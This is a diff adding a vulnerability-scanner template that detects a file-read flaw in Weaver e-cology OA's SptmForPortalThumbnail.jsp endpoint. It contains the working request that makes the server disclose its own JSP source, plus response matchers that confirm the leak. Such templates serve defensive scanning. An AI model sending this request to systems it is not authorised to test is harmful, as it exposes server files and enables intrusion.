@@ -1,0 +1,24 @@
+id: weaver_e_cology_oa-readfile
+info:
+  name: Weaver e-cology Readfile Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects a readfile vulnerability in Weaver e-cology application through the `SptmForPortalThumbnail.jsp` endpoint.
+  reference:
+    - http://124.223.89.192/archives/e-cology8-14
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "weaver.general.BaseBean"
+          - "getServletConfig"
+        part: body
+      - type: status
+        status:
+          - 200
